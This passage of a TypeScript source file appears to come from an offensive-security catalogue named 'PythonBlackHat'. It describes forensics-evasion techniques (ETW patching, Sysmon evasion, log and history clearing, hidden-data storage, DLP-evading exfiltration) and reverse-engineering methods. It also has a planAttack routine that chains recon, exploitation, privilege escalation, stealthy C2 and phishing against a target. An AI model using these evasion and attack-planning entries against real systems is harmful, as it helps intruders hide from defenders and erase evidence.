    name: 'Image-Based Steganography (LSB)',
    category: 'steganography',
    description:
      'Hide data in image least significant bits — embed encrypted payloads in PNG/BMP pixel data with minimal visual impact, supports extraction and verification',
    pythonApproach:
      'Pillow to open image, iterate pixels modifying LSB of RGB channels to encode data bits, optional AES encryption before embedding, extract by reading LSBs in same order',
    libraries: ['pillow', 'pycryptodome', 'struct'],
    targetArtifact: 'Image files (covert data storage)',
    effectiveness: 0.8,
  })
  add({
    id: 'pyforensic-audio-stego',
    name: 'Audio Steganography',
    category: 'steganography',
    description:
      'Hide data in audio file samples — LSB encoding in WAV sample data, spread-spectrum techniques in MP3, frequency domain embedding',
    pythonApproach:
      'wave module to read WAV frames, modify LSB of 16-bit samples to encode data, maintain audio quality by limiting embedding capacity, verify with extraction',
    libraries: ['wave', 'struct', 'numpy'],
    targetArtifact: 'Audio files (covert data channel)',
    effectiveness: 0.75,
  })
  add({
    id: 'pyforensic-ads',
    name: 'NTFS Alternate Data Streams',
    category: 'covert_storage',
    description:
      'Hide data in NTFS Alternate Data Streams — store payloads, tools, or exfiltrated data in hidden ADS attached to legitimate files, invisible to basic directory listing',
    pythonApproach:
      'Open file with ADS path notation (file.txt:hidden_stream), write data to alternate stream, access via full ADS path, enumerate ADS with dir /r or custom NTFS parser',
    libraries: ['os', 'ctypes'],
    targetArtifact: 'NTFS Alternate Data Streams',
    effectiveness: 0.7,
  })

  // Extended forensics evasion
  add({
    id: 'pyforensic-sysmon-bypass',
    name: 'Sysmon Log Evasion',
    category: 'log_clearing',
    description:
      'Evade Sysmon process monitoring — unload Sysmon driver, patch ETW provider, or use techniques that avoid triggering Sysmon event IDs',
    pythonApproach:
      'Detect Sysmon via driver name enumeration, patch EtwEventWrite to prevent telemetry, or use direct syscalls that bypass Sysmon minifilter hooks',
    libraries: ['ctypes', 'subprocess', 'os'],
    targetArtifact: 'Sysmon event logs (process creation, network, file events)',
    effectiveness: 0.65,
  })
  add({
    id: 'pyforensic-slack-space',
    name: 'File Slack Space Hiding',
    category: 'covert_storage',
    description:
      'Hide data in file slack space — write data to unused space between file end and cluster boundary, invisible to standard file operations',
    pythonApproach:
      'Calculate file slack (cluster_size - file_size % cluster_size), write covert data via direct disk access or raw device I/O, read back by calculating exact slack offset',
    libraries: ['os', 'ctypes', 'struct'],
    targetArtifact: 'File system slack space',
    effectiveness: 0.8,
  })
  add({
    id: 'pyforensic-proc-hollow-trace',
    name: 'Process Execution Trace Removal',
    category: 'artifact_removal',
    description:
      'Remove evidence of process execution — clean process creation events, remove memory forensics artifacts, overwrite command line history',
    pythonApproach:
      'Clear bash_history/PSReadLine, modify /proc/self/cmdline at runtime, overwrite environment variables containing sensitive data, clean up argv in memory',
    libraries: ['os', 'ctypes', 'subprocess'],
    targetArtifact: 'Process execution traces (history, argv, environment)',
    effectiveness: 0.6,
  })
  add({
    id: 'pyforensic-network-trace-clean',
    name: 'Network Connection Trace Cleanup',
    category: 'artifact_removal',
    description:
      'Remove evidence of network connections — clear connection tracking tables, remove firewall logs, clean DNS cache entries referencing C2 domains',
    pythonApproach:
      'Flush iptables conntrack via subprocess, clear /var/log/ufw.log entries, ipconfig /flushdns or resolvectl flush-caches, remove entries from /etc/hosts if modified',
    libraries: ['subprocess', 'os', 're'],
    targetArtifact: 'Network connection logs and DNS cache',
    effectiveness: 0.6,
  })
  add({
    id: 'pyforensic-etw-patch',
    name: 'ETW (Event Tracing for Windows) Patching',
    category: 'log_clearing',
    description:
      'Patch ETW providers to disable telemetry at source — prevent security tools from receiving events by modifying EtwEventWrite in ntdll.dll in memory',
    pythonApproach:
      'ctypes to locate ntdll!EtwEventWrite, VirtualProtect to make writable, patch with ret instruction (0xC3) to disable all ETW event generation in current process',
    libraries: ['ctypes'],
    targetArtifact: 'ETW event providers (Microsoft-Windows-Threat-Intelligence, etc.)',
    effectiveness: 0.85,
  })
  add({
    id: 'pyforensic-encrypted-exfil',
    name: 'Encrypted Data Exfiltration Wrapper',
    category: 'anti_forensics',
    description:
      'Encrypt and encode all exfiltrated data to prevent content inspection — AES-GCM encryption with ephemeral keys, custom encoding to avoid DLP signatures',
    pythonApproach:
      'Generate ephemeral AES-256-GCM key per session, encrypt data before any exfil channel, encode ciphertext with custom base encoding to avoid base64 detection, key exchange via asymmetric crypto',
    libraries: ['pycryptodome', 'struct'],
    targetArtifact: 'DLP and network inspection systems',
    effectiveness: 0.85,
  })

  return db
}

function buildReverseEngineeringTechniques(): ReverseEngineeringTechnique[] {
  const db: ReverseEngineeringTechnique[] = []
  const add = (t: ReverseEngineeringTechnique) => {
    db.push(t)
  }

  add({
    id: 'pyre-disasm',
    name: 'Binary Disassembly with Capstone',
    category: 'static_analysis',
    description:
      'Disassemble binary code using Capstone engine — multi-architecture support (x86/ARM/MIPS), instruction details, cross-references, basic block identification',
    pythonApproach:
      'Capstone Cs(CS_ARCH_X86, CS_MODE_64) disassembler, iterate instructions from code sections parsed via pefile/pyelftools, identify call/jmp targets for xref building',
    libraries: ['capstone', 'pefile', 'pyelftools'],
    targetFormat: 'PE/ELF/Raw shellcode',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyre-header-analysis',
    name: 'PE/ELF Header Analysis',
    category: 'static_analysis',
    description:
      'Parse PE and ELF binary headers — import/export tables, section characteristics, entropy analysis for packer detection, compile timestamps, debug information',
    pythonApproach:
      'pefile.PE() for Windows executables (imports, exports, sections, resources), pyelftools ELFFile for Linux binaries (segments, symbols, dynamic linking info)',
    libraries: ['pefile', 'pyelftools', 'lief'],
    targetFormat: 'PE (Windows) / ELF (Linux)',
    difficulty: 'beginner',
  })
  add({
    id: 'pyre-frida-trace',
    name: 'Process Tracing with Frida',
    category: 'dynamic_analysis',
    description:
      'Runtime process instrumentation using Frida — hook functions, trace API calls, modify return values, dump memory regions, intercept crypto operations',
    pythonApproach:
      'frida.attach(pid), inject JavaScript hooks via session.create_script(), intercept function calls with Interceptor.attach, log arguments and return values',
    libraries: ['frida', 'frida-tools'],
    targetFormat: 'Running process (any platform)',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-api-hook',
    name: 'API Hooking and Monitoring',
    category: 'dynamic_analysis',
    description:
      'Monitor and modify API calls at runtime — hook Windows API (kernel32/ntdll) or Linux libc calls, log parameters, modify return values for analysis',
    pythonApproach:
      'Frida Interceptor.attach to target APIs (CreateFile, connect, recv), log all parameters and return values, optionally modify arguments or returns for behavior analysis',
    libraries: ['frida', 'ctypes'],
    targetFormat: 'Running process',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-ghidra-headless',
    name: 'Ghidra Headless Decompilation',
    category: 'decompilation',
    description:
      'Automated binary decompilation using Ghidra headless analyzer — batch decompilation, function signature recovery, data type propagation, script-driven analysis',
    pythonApproach:
      'subprocess to invoke Ghidra analyzeHeadless with post-analysis scripts, Ghidra Python scripts for decompilation output via DecompInterface, parse decompiled C code',
    libraries: ['subprocess', 'ghidra-bridge'],
    targetFormat: 'PE/ELF/Mach-O',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyre-gdb-script',
    name: 'GDB Scripting with Python',
    category: 'debugging',
    description:
      'Automate debugging workflows with GDB Python API — set conditional breakpoints, automate heap analysis, trace execution flow, extract runtime data',
    pythonApproach:
      'GDB Python API: gdb.Breakpoint for breakpoints, gdb.execute for commands, gdb.parse_and_eval for expression evaluation, custom pretty-printers for data structures',
    libraries: ['gdb', 'struct'],
    targetFormat: 'ELF/core dumps',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-upx-unpack',
    name: 'UPX/Custom Packer Unpacking',
    category: 'unpacking',
    description:
      'Unpack compressed/encrypted executables — UPX stub detection and decompression, generic unpacking via OEP detection, memory dumping at original entry point',
    pythonApproach:
      'Detect packer via section names/entropy analysis, run packed binary under debugger, set breakpoint at OEP (tail jump), dump unpacked process memory, fix imports with Scylla/imprecon',
    libraries: ['pefile', 'capstone', 'frida', 'lief'],
    targetFormat: 'UPX/ASPack/Themida packed PE',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-dotnet-deobf',
    name: '.NET Assembly Deobfuscation',
    category: 'unpacking',
    description:
      'Deobfuscate .NET assemblies — remove control flow obfuscation, decrypt strings, resolve dynamic method calls, decompile with dnlib/ILSpy integration',
    pythonApproach:
      'Parse .NET metadata with dnfile Python library, decrypt obfuscated strings by emulating decryption routine, use de4dot subprocess for automated deobfuscation',
    libraries: ['dnfile', 'subprocess'],
    targetFormat: '.NET assemblies (DLL/EXE)',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-anti-debug',
    name: 'Anti-Debug Detection Techniques',
    category: 'anti_reversing',
    description:
      'Detect and catalog anti-debugging techniques in binaries — IsDebuggerPresent, NtQueryInformationProcess, timing checks, INT 2D, TLS callbacks',
    pythonApproach:
      'Static analysis: scan for known anti-debug API imports and patterns with capstone. Dynamic: Frida hooks on anti-debug APIs to log and bypass detections',
    libraries: ['capstone', 'pefile', 'frida'],
    targetFormat: 'PE (anti-debug protected)',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-binary-patch',
    name: 'Binary Patching with LIEF',
    category: 'binary_patching',
    description:
      'Modify binary executables programmatically — patch instructions, add sections, modify imports/exports, inject code caves, rebuild headers',
    pythonApproach:
      'lief.parse() to load binary, modify instructions via section data, add new sections with lief.PE.Section, hook imports by adding new entries, rebuild with lief.PE.Builder',
    libraries: ['lief', 'keystone-engine', 'capstone'],
    targetFormat: 'PE/ELF/Mach-O',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyre-protocol-re',
    name: 'Network Protocol Reverse Engineering',
    category: 'protocol_reversing',
    description:
      'Reverse engineer unknown network protocols — capture traffic, identify message structures, discover field boundaries, build protocol dissectors',
    pythonApproach:
      'Scapy sniff to capture protocol traffic, analyze byte patterns and field boundaries, build custom Scapy packet class with Packet/Field definitions, validate with replays',
    libraries: ['scapy', 'struct', 'mitmproxy'],
    targetFormat: 'Network protocols (TCP/UDP)',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-firmware',
    name: 'IoT Firmware Extraction and Analysis',
    category: 'firmware_analysis',
    description:
      'Extract and analyze IoT device firmware — binwalk for filesystem extraction, find hardcoded credentials, identify vulnerable services, backdoor analysis',
    pythonApproach:
      'binwalk to extract firmware filesystem (binwalk -e firmware.bin), search extracted files for credentials/keys with regex, identify busybox/service versions for CVEs',
    libraries: ['binwalk', 'pefile', 'pyelftools'],
    targetFormat: 'Firmware images (embedded Linux)',
    difficulty: 'intermediate',
  })

  // Extended reverse engineering
  add({
    id: 'pyre-symbolic-exec',
    name: 'Symbolic Execution with angr',
    category: 'static_analysis',
    description:
      'Automated path exploration using angr symbolic execution — find inputs that reach specific code paths, solve CTF challenges, discover vulnerabilities',
    pythonApproach:
      'angr.Project(binary), create SimulationManager, explore with find=target_addr and avoid=bad_addrs, extract stdin/argv from found state for solving',
    libraries: ['angr', 'claripy'],
    targetFormat: 'ELF/PE binaries',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-emulation',
    name: 'Code Emulation with Unicorn',
    category: 'dynamic_analysis',
    description:
      'Emulate binary code snippets using Unicorn engine — execute shellcode, unpack obfuscated code, analyze malware without full execution environment',
    pythonApproach:
      'unicorn.Uc(UC_ARCH_X86, UC_MODE_64), map memory with mem_map, write code with mem_write, add hooks with hook_add, start emulation with emu_start',
    libraries: ['unicorn', 'capstone', 'struct'],
    targetFormat: 'Raw shellcode / code snippets',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-obfuscation-detect',
    name: 'Code Obfuscation Detection',
    category: 'static_analysis',
    description:
      'Detect and classify code obfuscation techniques — entropy analysis, control flow complexity metrics, string encryption detection, packer identification',
    pythonApproach:
      'Calculate section entropy with pefile, analyze control flow graph complexity with angr/capstone, detect encrypted strings by entropy windowing, match packer signatures',
    libraries: ['pefile', 'capstone', 'math'],
    targetFormat: 'PE/ELF (obfuscated)',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyre-dll-export',
    name: 'DLL Export Analysis and Hooking',
    category: 'dynamic_analysis',
    description:
      'Analyze DLL exports and create proxy DLLs — enumerate exported functions, generate wrapper DLLs that log calls while forwarding to original',
    pythonApproach:
      'pefile to enumerate DLL exports, generate C/Python wrapper code for each export, compile proxy DLL that logs arguments and return values while forwarding calls',
    libraries: ['pefile', 'lief', 'ctypes'],
    targetFormat: 'Windows DLL',
    difficulty: 'intermediate',
  })
  add({
    id: 'pyre-cfg-recovery',
    name: 'Control Flow Graph Recovery',
    category: 'static_analysis',
    description:
      'Reconstruct program control flow graph from binary — identify basic blocks, branches, function boundaries, loop structures, and call graph',
    pythonApproach:
      'Capstone disassembly to identify branch/call instructions, build basic block graph, identify function prologues/epilogues, reconstruct CFG with networkx visualization',
    libraries: ['capstone', 'pefile', 'networkx'],
    targetFormat: 'PE/ELF binaries',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-string-decrypt',
    name: 'Encrypted String Recovery',
    category: 'static_analysis',
    description:
      'Find and decrypt obfuscated strings in malware — identify encryption routines, extract encrypted data and keys, apply decryption algorithm to recover IOCs',
    pythonApproach:
      'Identify common string decryption patterns (XOR loop, RC4, base64+AES), extract encrypted blobs and key material, emulate decryption routine with unicorn or implement in Python',
    libraries: ['capstone', 'unicorn', 'pycryptodome'],
    targetFormat: 'Obfuscated malware samples',
    difficulty: 'advanced',
  })
  add({
    id: 'pyre-yara-gen',
    name: 'YARA Rule Generation',
    category: 'static_analysis',
    description:
      'Automatically generate YARA rules from malware samples — extract unique strings, code patterns, and structural features for signature creation',
    pythonApproach:
      'Extract unique strings with pefile, identify distinctive code sequences with capstone, generate YARA rules with condition combining string matches and file structure checks',
    libraries: ['yara-python', 'pefile', 'capstone'],
    targetFormat: 'Malware samples (any format)',
    difficulty: 'intermediate',
  })

  return db
}

// ── Main Class ───────────────────────────────────────────────────────────────

export class PythonBlackHat {
  private readonly config: PythonBlackHatConfig
  private stats: PythonBlackHatStats

  // Knowledge databases
  private readonly pythonLibraries: readonly PythonLibraryProfile[]
  private readonly exploitDevTechniques: readonly ExploitDevTechnique[]
  private readonly malwareTechniques: readonly MalwareTechnique[]
  private readonly networkAttacks: readonly NetworkAttack[]
  private readonly webExploits: readonly WebExploit[]
  private readonly reconTechniques: readonly ReconTechnique[]
  private readonly privEscPaths: readonly PrivEscPath[]
  private readonly c2Configs: readonly C2Config[]
  private readonly evasionMethods: readonly EvasionMethod[]
  private readonly pythonTools: readonly PythonTool[]
  private readonly cryptoAttacks: readonly CryptoAttack[]
  private readonly socialEngineeringAttacks: readonly SocialEngineeringAttack[]
  private readonly forensicsEvasionTechniques: readonly ForensicsEvasionTechnique[]
  private readonly reverseEngineeringTechniques: readonly ReverseEngineeringTechnique[]

  constructor(config: Partial<PythonBlackHatConfig> = {}) {
    this.config = { ...DEFAULT_PYTHON_BLACKHAT_CONFIG, ...config }
    this.stats = {
      totalToolsGenerated: 0,
      totalExploitsCreated: 0,
      totalAttacksCrafted: 0,
      totalReconScans: 0,
      totalMalwareSamples: 0,
      totalEvasionTechniques: 0,
      totalC2Configs: 0,
      totalPrivEscPaths: 0,
      totalCryptoAttacks: 0,
      totalSocialEngineering: 0,
      totalForensicsEvasion: 0,
      totalReverseEngineering: 0,
      totalLookups: 0,
      feedbackCount: 0,
    }

    this.pythonLibraries = buildPythonLibraries()
    this.exploitDevTechniques = buildExploitDevTechniques()
    this.malwareTechniques = buildMalwareTechniques()
    this.networkAttacks = buildNetworkAttacks()
    this.webExploits = buildWebExploits()
    this.reconTechniques = buildReconTechniques()
    this.privEscPaths = buildPrivEscPaths()
    this.c2Configs = buildC2Configs()
    this.evasionMethods = buildEvasionMethods()
    this.pythonTools = buildPythonTools()
    this.cryptoAttacks = buildCryptoAttacks()
    this.socialEngineeringAttacks = buildSocialEngineeringAttacks()
    this.forensicsEvasionTechniques = buildForensicsEvasionTechniques()
    this.reverseEngineeringTechniques = buildReverseEngineeringTechniques()
  }

  // ── Library Lookup ──

  findLibrary(name: string): PythonLibraryProfile | undefined {
    this.stats.totalLookups++
    const lower = name.toLowerCase()
    return this.pythonLibraries.find(
      l => l.name.toLowerCase() === lower || l.pipPackage.toLowerCase() === lower,
    )
  }

  getLibrariesByDomain(domain: AttackDomain): PythonLibraryProfile[] {
    this.stats.totalLookups++
    return this.pythonLibraries.filter(l => l.domain === domain)
  }

  getAllLibraries(): readonly PythonLibraryProfile[] {
    return this.pythonLibraries
  }

  // ── Exploit Development ──

  getExploitDevTechnique(category: ExploitDevTechnique['category']): ExploitDevTechnique[] {
    this.stats.totalExploitsCreated++
    return this.exploitDevTechniques.filter(t => t.category === category)
  }

  getExploitDevByDifficulty(difficulty: Difficulty): ExploitDevTechnique[] {
    return this.exploitDevTechniques.filter(t => t.difficulty === difficulty)
  }

  getAllExploitDevTechniques(): readonly ExploitDevTechnique[] {
    return this.exploitDevTechniques
  }

  // ── Malware ──

  getMalwareTechnique(category: MalwareTechnique['category']): MalwareTechnique[] {
    this.stats.totalMalwareSamples++
    return this.malwareTechniques.filter(t => t.category === category)
  }

  getMalwareByDifficulty(difficulty: Difficulty): MalwareTechnique[] {
    return this.malwareTechniques.filter(t => t.difficulty === difficulty)
  }

  getAllMalwareTechniques(): readonly MalwareTechnique[] {
    return this.malwareTechniques
  }

  // ── Network Attacks ──

  getNetworkAttack(category: NetworkAttack['category']): NetworkAttack[] {
    this.stats.totalAttacksCrafted++
    return this.networkAttacks.filter(a => a.category === category)
  }

  getNetworkAttacksByLayer(layer: NetworkAttack['targetLayer']): NetworkAttack[] {
    return this.networkAttacks.filter(a => a.targetLayer === layer)
  }

  getAllNetworkAttacks(): readonly NetworkAttack[] {
    return this.networkAttacks
  }

  // ── Web Exploitation ──

  getWebExploit(category: WebExploit['category']): WebExploit[] {
    this.stats.totalAttacksCrafted++
    return this.webExploits.filter(e => e.category === category)
  }

  getWebExploitsByOWASP(owaspCategory: string): WebExploit[] {
    const lower = owaspCategory.toLowerCase()
    return this.webExploits.filter(e => e.owaspCategory.toLowerCase().includes(lower))
  }

  getAllWebExploits(): readonly WebExploit[] {
    return this.webExploits
  }

  // ── Reconnaissance ──

  getReconTechnique(category: ReconTechnique['category']): ReconTechnique[] {
    this.stats.totalReconScans++
    return this.reconTechniques.filter(r => r.category === category)
  }

  getPassiveRecon(): ReconTechnique[] {
    return this.reconTechniques.filter(r => r.passiveOrActive === 'passive')
  }

  getActiveRecon(): ReconTechnique[] {
    return this.reconTechniques.filter(r => r.passiveOrActive === 'active')
  }

  getAllReconTechniques(): readonly ReconTechnique[] {
    return this.reconTechniques
  }

  // ── Privilege Escalation ──

  getPrivEscPath(category: PrivEscPath['category']): PrivEscPath[] {
    this.stats.totalPrivEscPaths++
    return this.privEscPaths.filter(p => p.category === category)
  }

  getPrivEscByPlatform(platform: TargetOS): PrivEscPath[] {
    return this.privEscPaths.filter(p => p.platform === platform || p.platform === 'cross_platform')
  }

  getAllPrivEscPaths(): readonly PrivEscPath[] {
    return this.privEscPaths
  }

  // ── C2 Frameworks ──

  getC2Config(protocol: C2Config['protocol']): C2Config[] {
    this.stats.totalC2Configs++
    return this.c2Configs.filter(c => c.protocol === protocol)
  }

  getStealthiestC2(minStealthRating?: number): C2Config[] {
    const threshold = minStealthRating ?? 0.7
    return [...this.c2Configs]
      .filter(c => c.stealthRating >= threshold)
      .sort((a, b) => b.stealthRating - a.stealthRating)
  }

  getAllC2Configs(): readonly C2Config[] {
    return this.c2Configs
  }

  // ── Evasion ──

  getEvasionMethod(category: EvasionMethod['category']): EvasionMethod[] {
    this.stats.totalEvasionTechniques++
    return this.evasionMethods.filter(e => e.category === category)
  }

  getEvasionByDefense(defense: string): EvasionMethod[] {
    const lower = defense.toLowerCase()
    return this.evasionMethods.filter(
      e => e.targetDefense.toLowerCase().includes(lower) || e.name.toLowerCase().includes(lower),
    )
  }

  getMostEffectiveEvasion(minEffectiveness?: number): EvasionMethod[] {
    const threshold = minEffectiveness ?? 0.6
    return [...this.evasionMethods]
      .filter(e => e.effectiveness >= threshold)
      .sort((a, b) => b.effectiveness - a.effectiveness)
  }

  getAllEvasionMethods(): readonly EvasionMethod[] {
    return this.evasionMethods
  }

  // ── Tools ──

  getTool(domain: AttackDomain): PythonTool[] {
    this.stats.totalToolsGenerated++
    return this.pythonTools.filter(t => t.domain === domain)
  }

  getToolsByDifficulty(difficulty: Difficulty): PythonTool[] {
    return this.pythonTools.filter(t => t.difficulty === difficulty)
  }

  getToolsByOS(os: TargetOS): PythonTool[] {
    return this.pythonTools.filter(t => t.targetOS === os || t.targetOS === 'cross_platform')
  }

  getStealthiestTools(minStealthRating?: number): PythonTool[] {
    const threshold = minStealthRating ?? 0.7
    return [...this.pythonTools]
      .filter(t => t.stealthRating >= threshold)
      .sort((a, b) => b.stealthRating - a.stealthRating)
  }

  getAllTools(): readonly PythonTool[] {
    return this.pythonTools
  }

  // ── Attack Planning ──

  planAttack(
    target: string,
    objectives: string[],
  ): {
    reconPhase: ReconTechnique[]
    exploitPhase: (WebExploit | NetworkAttack)[]
    privEscPhase: PrivEscPath[]
    persistPhase: C2Config[]
    evasionPhase: EvasionMethod[]
    cryptoPhase: CryptoAttack[]
    socialPhase: SocialEngineeringAttack[]
    tools: PythonTool[]
    estimatedDifficulty: Difficulty
    totalSteps: number
  } {
    const objStr = objectives.join(',').toLowerCase()
    const isWeb = objStr.includes('web') || target.includes('http')
    const isNetwork =
      objStr.includes('network') || objStr.includes('lan') || objStr.includes('internal')
    const isSocial =
      objStr.includes('social') || objStr.includes('phish') || objStr.includes('human')
    const isCrypto =
      objStr.includes('crypto') || objStr.includes('password') || objStr.includes('hash')

    const recon = isWeb
      ? this.reconTechniques
          .filter(r => ['web_fingerprint', 'subdomain_enum', 'vuln_scan'].includes(r.category))
          .slice(0, 3)
      : this.reconTechniques
          .filter(r => ['port_scan', 'network_map', 'service_enum'].includes(r.category))
          .slice(0, 3)

    const exploits: (WebExploit | NetworkAttack)[] = isWeb
      ? this.webExploits
          .filter(e => ['sqli', 'rce', 'ssti', 'auth_bypass'].includes(e.category))
          .slice(0, 3)
      : this.networkAttacks
          .filter(a => ['arp_spoof', 'mitm', 'sniffing'].includes(a.category))
          .slice(0, 3)

    const privesc = isNetwork
      ? this.privEscPaths.filter(p => p.platform === 'linux').slice(0, 3)
      : this.privEscPaths.filter(p => p.platform === 'windows').slice(0, 3)

    const c2 = this.getStealthiestC2(0.7).slice(0, 2)
    const evasion = this.getMostEffectiveEvasion(0.6).slice(0, 3)

    const crypto = isCrypto
      ? this.cryptoAttacks
          .filter(a => ['password_attack', 'hash_cracking'].includes(a.category))
          .slice(0, 2)
      : []

    const social = isSocial
      ? this.socialEngineeringAttacks
          .filter(a => ['phishing', 'spear_phishing', 'credential_harvest'].includes(a.category))
          .slice(0, 2)
      : []

    const relevantTools = this.pythonTools
      .filter(t => {
        if (isWeb && (t.domain === 'web_exploitation' || t.domain === 'reconnaissance')) return true
        if (isNetwork && (t.domain === 'network_attack' || t.domain === 'reconnaissance'))
          return true
        if (isSocial && t.domain === 'social_engineering') return true
        if (isCrypto && t.domain === 'crypto_attack') return true
        return t.domain === 'evasion' || t.domain === 'c2_framework'
      })
      .slice(0, 5)

    const totalSteps =
      recon.length +
      exploits.length +
      privesc.length +
      c2.length +
      evasion.length +
      crypto.length +
      social.length
    const estimatedDifficulty: Difficulty =
      totalSteps > 12
        ? 'expert'
        : totalSteps > 8
          ? 'advanced'
          : totalSteps > 4
            ? 'intermediate'
            : 'beginner'

    this.stats.totalToolsGenerated++

    return {
      reconPhase: recon,
      exploitPhase: exploits,
      privEscPhase: privesc,
      persistPhase: c2,
      evasionPhase: evasion,
      cryptoPhase: crypto,
      socialPhase: social,
      tools: relevantTools,
      estimatedDifficulty,
      totalSteps,
    }
  }

  // ── Knowledge Search ──

  searchKnowledge(query: string): {
    libraries: PythonLibraryProfile[]
    tools: PythonTool[]
    exploitDev: ExploitDevTechnique[]
    malware: MalwareTechnique[]
    networkAttacks: NetworkAttack[]
    webExploits: WebExploit[]
    recon: ReconTechnique[]
    privEsc: PrivEscPath[]
    c2: C2Config[]
    evasion: EvasionMethod[]
    cryptoAttacks: CryptoAttack[]
    socialEngineering: SocialEngineeringAttack[]
    forensicsEvasion: ForensicsEvasionTechnique[]
    reverseEngineering: ReverseEngineeringTechnique[]
  } {
    const tokens = query
      .toLowerCase()
      .split(/[\s,;:|_\-/\\]+/)
      .filter(Boolean)
    this.stats.totalLookups++

    const matchAny = (text: string): boolean => tokens.some(t => text.toLowerCase().includes(t))

    return {
      libraries: this.pythonLibraries.filter(l =>
        matchAny(l.name + ' ' + l.description + ' ' + l.keyFeatures.join(' ')),
      ),
      tools: this.pythonTools.filter(t => matchAny(t.name + ' ' + t.description + ' ' + t.domain)),
      exploitDev: this.exploitDevTechniques.filter(t =>
        matchAny(t.name + ' ' + t.description + ' ' + t.category),
      ),
      malware: this.malwareTechniques.filter(t =>
        matchAny(t.name + ' ' + t.description + ' ' + t.category),
      ),
      networkAttacks: this.networkAttacks.filter(a =>
        matchAny(a.name + ' ' + a.description + ' ' + a.category),
      ),
      webExploits: this.webExploits.filter(e =>
        matchAny(e.name + ' ' + e.description + ' ' + e.category),
      ),
      recon: this.reconTechniques.filter(r =>
        matchAny(r.name + ' ' + r.description + ' ' + r.category),
      ),
      privEsc: this.privEscPaths.filter(p =>
        matchAny(p.name + ' ' + p.description + ' ' + p.category),
      ),
      c2: this.c2Configs.filter(c => matchAny(c.name + ' ' + c.description + ' ' + c.protocol)),
      evasion: this.evasionMethods.filter(e =>
        matchAny(e.name + ' ' + e.description + ' ' + e.category),
      ),
      cryptoAttacks: this.cryptoAttacks.filter(a =>
        matchAny(a.name + ' ' + a.description + ' ' + a.category),
      ),
      socialEngineering: this.socialEngineeringAttacks.filter(a =>
        matchAny(a.name + ' ' + a.description + ' ' + a.category),
      ),
      forensicsEvasion: this.forensicsEvasionTechniques.filter(t =>
        matchAny(t.name + ' ' + t.description + ' ' + t.category),
      ),
      reverseEngineering: this.reverseEngineeringTechniques.filter(t =>
        matchAny(t.name + ' ' + t.description + ' ' + t.category),
      ),
    }
  }

  // ── Crypto Attacks ──

  getCryptoAttack(category: CryptoAttack['category']): CryptoAttack[] {
    this.stats.totalCryptoAttacks++
    return this.cryptoAttacks.filter(a => a.category === category)
  }

  getCryptoAttacksByAlgorithm(algorithm: string): CryptoAttack[] {
    const lower = algorithm.toLowerCase()
    return this.cryptoAttacks.filter(a => a.targetAlgorithm.toLowerCase().includes(lower))
  }

  getAllCryptoAttacks(): readonly CryptoAttack[] {
    return this.cryptoAttacks
  }

  // ── Social Engineering ──

  getSocialEngineeringAttack(
    category: SocialEngineeringAttack['category'],
  ): SocialEngineeringAttack[] {
    this.stats.totalSocialEngineering++
    return this.socialEngineeringAttacks.filter(a => a.category === category)
  }

  getSocialEngineeringBySuccessRate(minRate?: number): SocialEngineeringAttack[] {
    const threshold = minRate ?? 0.2
    return [...this.socialEngineeringAttacks]
      .filter(a => a.successRate >= threshold)
      .sort((a, b) => b.successRate - a.successRate)
  }

  getAllSocialEngineeringAttacks(): readonly SocialEngineeringAttack[] {
    return this.socialEngineeringAttacks
  }

  // ── Forensics Evasion ──

  getForensicsEvasion(
    category: ForensicsEvasionTechnique['category'],
  ): ForensicsEvasionTechnique[] {
    this.stats.totalForensicsEvasion++
    return this.forensicsEvasionTechniques.filter(t => t.category === category)
  }

  getForensicsEvasionByEffectiveness(minEffectiveness?: number): ForensicsEvasionTechnique[] {
    const threshold = minEffectiveness ?? 0.6
    return [...this.forensicsEvasionTechniques]
      .filter(t => t.effectiveness >= threshold)
      .sort((a, b) => b.effectiveness - a.effectiveness)
  }

  getAllForensicsEvasionTechniques(): readonly ForensicsEvasionTechnique[] {
    return this.forensicsEvasionTechniques
  }

  // ── Reverse Engineering ──

  getReverseEngineeringTechnique(
    category: ReverseEngineeringTechnique['category'],
  ): ReverseEngineeringTechnique[] {
    this.stats.totalReverseEngineering++
    return this.reverseEngineeringTechniques.filter(t => t.category === category)
  }

  getReverseEngineeringByDifficulty(difficulty: Difficulty): ReverseEngineeringTechnique[] {
    return this.reverseEngineeringTechniques.filter(t => t.difficulty === difficulty)
  }

  getAllReverseEngineeringTechniques(): readonly ReverseEngineeringTechnique[] {
    return this.reverseEngineeringTechniques
  }

  // ── Cross-Domain Search & Analysis ──

  getTechniqueById(
    id: string,
  ):
    | ExploitDevTechnique
    | MalwareTechnique
    | NetworkAttack
    | WebExploit
    | ReconTechnique
    | PrivEscPath
    | C2Config
    | EvasionMethod
    | CryptoAttack
    | SocialEngineeringAttack
    | ForensicsEvasionTechnique
    | ReverseEngineeringTechnique
    | PythonTool
    | undefined {
    this.stats.totalLookups++
    type AnyTechnique =
      | ExploitDevTechnique
      | MalwareTechnique
      | NetworkAttack
      | WebExploit
      | ReconTechnique
      | PrivEscPath
      | C2Config
      | EvasionMethod
      | CryptoAttack
      | SocialEngineeringAttack
      | ForensicsEvasionTechnique
      | ReverseEngineeringTechnique
      | PythonTool
    const all: AnyTechnique[] = [
      ...(this.exploitDevTechniques as unknown as AnyTechnique[]),
      ...(this.malwareTechniques as unknown as AnyTechnique[]),
      ...(this.networkAttacks as unknown as AnyTechnique[]),
      ...(this.webExploits as unknown as AnyTechnique[]),
      ...(this.reconTechniques as unknown as AnyTechnique[]),
      ...(this.privEscPaths as unknown as AnyTechnique[]),
      ...(this.c2Configs as unknown as AnyTechnique[]),
      ...(this.evasionMethods as unknown as AnyTechnique[]),
      ...(this.cryptoAttacks as unknown as AnyTechnique[]),
      ...(this.socialEngineeringAttacks as unknown as AnyTechnique[]),
      ...(this.forensicsEvasionTechniques as unknown as AnyTechnique[]),
